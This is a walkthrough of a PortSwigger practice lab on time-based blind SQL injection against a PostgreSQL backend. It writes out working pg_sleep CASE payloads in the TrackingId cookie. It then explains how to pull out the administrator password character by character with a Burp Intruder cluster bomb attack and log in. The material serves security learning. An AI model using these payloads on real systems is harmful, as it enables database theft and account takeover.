# Blind SQL Injection with Time Delays and Information Retrieval - [Link](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

## Goal
Exploit a blind SQL injection vulnerability in the `TrackingId` cookie to extract the administrator's password from the `users` table and log in as the administrator.

## Vulnerability
The application uses the `TrackingId` cookie in a SQL query without sanitization. No query results or errors are returned, but synchronous execution allows time-based delays to infer data from the `users` table (`username`, `password` columns).

## Solution Steps
1. **Confirm SQL Injection**:
   - Payload: `TrackingId=xyz'||(SELECT pg_sleep(10))--`
   - Result: 10-second delay confirms PostgreSQL backend (since `pg_sleep` works).

2. **Test Conditional Delays**:
   - Payload: `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--`
   - Result: 10-second delay confirms `CASE` statements work for conditional logic.
   - Note: `IF(1=1,SLEEP(10),'a')` failed (MySQL syntax, not PostgreSQL).

3. **Determine Password Length**:
   - Payload: `TrackingId=xyz'||(SELECT CASE WHEN (LENGTH(password)<30) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--`
     - Delay observed, confirming password length < 30.
   - Payload: `TrackingId=xyz'||(SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--`
     - Delay observed, confirming password length = 20 (lucky guess from prior labs).

4. **Extract Password Characters**:
   - Payload: `TrackingId=xyz'||(SELECT CASE WHEN (SUBSTRING(password,§pos§,1)='§char§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--`
   - Use Burp Intruder (Cluster Bomb attack):
     - Payload 1: `pos` (numbers 1 to 20).
     - Payload 2: `char` (brute-force, single characters, e.g., a-z, 0-9).
   - Steps:
     - Send payload to Burp Intruder.
     - Set `§pos§` and `§char§` as payload positions.
     - Configure payloads: `pos` (1-20), `char` (brute-force, length 1).
     - Start attack, sort by "Response received" (time).
     - Filter for responses >10,000ms (indicating 10-second delay).
     - Highlight matching responses to identify correct characters.
   - Result: Password characters extracted as `5zcrhuc9aq3qavytxu8m`.

5. **Log In**:
   - Use username `administrator` and password `5zcrhuc9aq3qavytxu8m` to log in, solving the lab.
